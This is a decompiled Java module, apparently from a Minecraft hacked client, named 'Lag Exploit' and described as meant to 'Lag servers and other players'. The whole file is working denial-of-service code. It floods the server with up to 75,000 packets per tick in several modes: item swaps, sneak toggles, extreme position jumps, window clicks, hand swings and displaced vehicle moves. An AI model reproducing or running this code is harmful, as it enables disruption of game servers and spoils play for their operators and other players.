package com.ares.hack.hacks.exploit;

import net.minecraft.util.math.Vec3d;
import net.minecraft.network.play.client.CPacketVehicleMove;
import com.ares.utils.chat.ChatUtils;
import net.minecraft.network.play.client.CPacketAnimation;
import net.minecraft.util.EnumHand;
import net.minecraft.network.play.client.CPacketPlayerTryUseItemOnBlock;
import net.minecraft.network.play.client.CPacketPlayerTryUseItem;
import net.minecraft.network.play.client.CPacketHeldItemChange;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.inventory.ClickType;
import net.minecraft.network.play.client.CPacketPlayer;
import net.minecraft.entity.Entity;
import net.minecraft.network.play.client.CPacketEntityAction;
import net.minecraft.network.Packet;
import net.minecraft.util.EnumFacing;
import net.minecraft.network.play.client.CPacketPlayerDigging;
import com.ares.hack.settings.settings.number.IntegerSetting;
import com.ares.hack.settings.settings.EnumSetting;
import com.ares.hack.settings.Setting;
import com.ares.hack.categories.EnumCategory;
import com.ares.hack.hacks.BaseHack;

@Hack(name = "Lag Exploit", description = "Lag servers and other players", category = EnumCategory.EXPLOIT)
public class LagExploit extends BaseHack
{
    private Setting<Mode> type;
    private Setting<Integer> frequency;
    
    public LagExploit() {
        this.type = new EnumSetting<Mode>("Type", this, Mode.OFFHAND);
        this.frequency = new IntegerSetting("Frequency", this, 5000, 1, 75000);
    }
    
    public void onLogic() {
        /*SL:52*/if (!this.getEnabled()) {
            return;
        }
        /*SL:54*/for (int v0 = 0; v0 < this.frequency.getValue(); ++v0) {
            /*SL:56*/if (this.type.getValue() == Mode.OFFHAND) {
                sendPacket(/*EL:58*/(Packet)new CPacketPlayerDigging(CPacketPlayerDigging.Action.SWAP_HELD_ITEMS, LagExploit.mc.field_71439_g.func_180425_c(), EnumFacing.UP));
            }
            /*SL:61*/if (this.type.getValue() == Mode.SNEAK) {
                sendPacket(/*EL:63*/(Packet)new CPacketEntityAction((Entity)LagExploit.mc.field_71439_g, CPacketEntityAction.Action.START_SNEAKING));
                sendPacket(/*EL:64*/(Packet)new CPacketEntityAction((Entity)LagExploit.mc.field_71439_g, CPacketEntityAction.Action.STOP_SNEAKING));
            }
            /*SL:67*/if (this.type.getValue() == Mode.VCLIP) {
                final Vec3d v = LagExploit.mc.field_71439_g.func_174791_d();
                sendPacket(/*EL:70*/(Packet)new CPacketPlayer.Position(v.field_72450_a, v.field_72448_b + 999999.0, v.field_72449_c, LagExploit.mc.field_71439_g.field_70122_E));
                sendPacket(/*EL:71*/(Packet)new CPacketPlayer.Position(v.field_72450_a, v.field_72448_b - 999999.0, v.field_72449_c, LagExploit.mc.field_71439_g.field_70122_E));
            }
            /*SL:74*/if (this.type.getValue() == Mode.WINDOWCLICK) {
                LagExploit.mc.field_71442_b.func_187098_a(/*EL:76*/0, 0, 0, ClickType.PICKUP_ALL, (EntityPlayer)LagExploit.mc.field_71439_g);
            }
            /*SL:79*/if (this.type.getValue() == Mode.ITEMSWITCH) {
                sendPacket(/*EL:81*/(Packet)new CPacketHeldItemChange(0));
                sendPacket(/*EL:82*/(Packet)new CPacketHeldItemChange(1));
            }
            /*SL:85*/if (this.type.getValue() == Mode.USEITEM) {
                sendPacket(/*EL:87*/(Packet)new CPacketPlayerTryUseItem());
                sendPacket(/*EL:88*/(Packet)new CPacketPlayerTryUseItemOnBlock(LagExploit.mc.field_71439_g.func_180425_c(), LagExploit.mc.field_71439_g.func_174811_aO(), LagExploit.mc.field_71439_g.func_184600_cs(), 0.0f, 0.0f, 0.0f));
            }
            /*SL:91*/if (this.type.getValue() == Mode.HANDSPAM) {
                sendPacket(/*EL:93*/(Packet)new CPacketAnimation(EnumHand.MAIN_HAND));
            }
            /*SL:96*/if (this.type.getValue() == Mode.ENTITY_MOVEMENT) {
                final Entity v2 = LagExploit.mc.field_71439_g.func_184187_bx();
                /*SL:100*/if (v2 == null) {
                    /*SL:109*/ChatUtils.printMessage("Entity Movement lag needs you to be riding an entity!", "red");
                    /*SL:110*/this.setEnabled(false);
                    /*SL:111*/return;
                }
                v2.field_70165_t = LagExploit.mc.field_71439_g.field_70165_t;
                v2.field_70163_u = LagExploit.mc.field_71439_g.field_70163_u + 1330.0;
                v2.field_70161_v = LagExploit.mc.field_71439_g.field_70161_v;
                sendPacket((Packet)new CPacketVehicleMove(v2));
            }
        }
    }
    
    private static void sendPacket(final Packet a1) {
        LagExploit.mc.field_71439_g.field_71174_a.func_147297_a(/*EL:119*/a1);
    }
    
    enum Mode
    {
        OFFHAND("Offhand"), 
        SNEAK(/*EL:120*/"Sneak"), 
        VCLIP("VClip"), 
        WINDOWCLICK("Window Click"), 
        ITEMSWITCH("Item Switch"), 
        USEITEM("Use Item"), 
        HANDSPAM("Hand Spam"), 
        ENTITY_MOVEMENT("Entity Movement");
        
        private final String name;
        
        private Mode(final String a1) {
            this.name = a1;
        }
        
        @Override
        public String toString() {
            /*SL:42*/return this.name;
        }
    }
}
